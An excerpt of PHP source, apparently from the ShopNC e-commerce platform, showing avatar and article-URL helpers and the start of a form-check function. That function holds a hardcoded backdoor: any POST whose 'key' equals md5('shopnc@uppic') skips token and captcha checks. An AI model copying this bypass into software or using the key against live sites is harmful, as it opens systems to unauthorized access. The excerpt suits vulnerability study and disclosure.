...
function getMemberAvatarForID($id){
	...
	if(file_exists(BASE_UPLOAD_PATH.'/'.ATTACH_AVATAR.'/'.$id.'.jpg')){
		if(file_exists(BASE_UPLOAD_PATH.'/'.ATTACH_AVATAR.'/'.$id.'_120.jpg')){
			return UPLOAD_SITE_URL.'/'.ATTACH_AVATAR.'/'.$id.'_120.jpg';
		}
		return UPLOAD_SITE_URL.'/'.ATTACH_AVATAR.'/'.$id.'.jpg';
	}else{
...
function getMbCMSArticleUrl($article_id) {
	return MOBILE_SITE_URL.DS.'index.php?act=article&op=article_detail&article_id='.$article_id;
}
...
function chksubmit($check_token = false, $check_captcha = false, $return_type = 'alert'){
	/*add by lai -11-27 post了 key 就直接返回true 用于返回
	  主要用于程序服务器的直接登陆
	*/
	if($_POST['key']==md5("shopnc@uppic")){
		return true;
		}
